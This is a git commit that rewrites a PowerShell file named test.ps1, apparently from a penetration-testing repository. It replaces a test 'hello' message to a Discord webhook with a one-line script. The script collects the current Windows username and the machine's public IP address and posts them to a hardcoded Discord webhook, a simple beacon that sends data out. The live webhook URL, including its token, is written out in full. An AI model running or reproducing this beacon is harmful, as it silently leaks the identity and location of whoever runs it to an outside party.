90d75cc30f7aa454c96b8086c476dd655975adc3
Opabinia <144001335+pentestfunctions@users.noreply.github.com>
2024-02-21 00:30:17 +1300

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,5 +1,1 @@
-$url = "https://discord.com/api/webhooks/1209454835729047562/AOYgRWEOfiiHBaPdfvn9hsdBDDgbnM27U89728F1BSzeBRfGEjxASbT4tfNFoh9hljzs"
-$body = @{
-    content = "hello"
-} | ConvertTo-Json
-Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
+$webhookUrl="https://discord.com/api/webhooks/1209454835729047562/AOYgRWEOfiiHBaPdfvn9hsdBDDgbnM27U89728F1BSzeBRfGEjxASbT4tfNFoh9hljzs";try{$u=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name;$ip=irm -Uri 'https://api.ipify.org';$msg=@{content="**System Information:**`n- Username: $u`n- Public IP: $ip"}|ConvertTo-Json;irm -Uri $webhookUrl -Method Post -Body $msg -ContentType "application/json"}catch{Write-Output "Error: $_"}
